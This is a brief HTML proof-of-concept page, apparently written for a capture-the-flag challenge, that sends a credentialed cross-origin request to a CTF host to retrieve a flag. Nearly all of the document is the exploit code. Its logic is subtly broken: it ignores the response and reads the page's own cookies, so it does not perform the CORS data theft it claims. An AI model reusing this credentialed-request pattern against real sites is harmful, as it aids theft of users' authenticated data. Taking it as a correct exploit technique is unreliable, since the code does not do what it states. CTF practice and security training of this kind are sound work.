<html>
  <!-- CORS PoC to Retrieve the Flag -->
  <body>
    <h2>CORS PoC</h2>
    <div id="demo">
        <button type="button" onclick="corsRequest()">Exploit</button>
    </div>
    <script>
      function corsRequest() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://ctf.widyasecurity.com/upload", true);
        xhr.withCredentials = true;
        xhr.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            // Assuming the flag is stored in a cookie named 'flag'
            var flag = document.cookie.split('; ').find(row => row.startsWith('flag=')).split('=')[1];
            alert('Flag: ' + flag);
          }
        };
        xhr.send();
      }
    </script>
  </body>
</html>
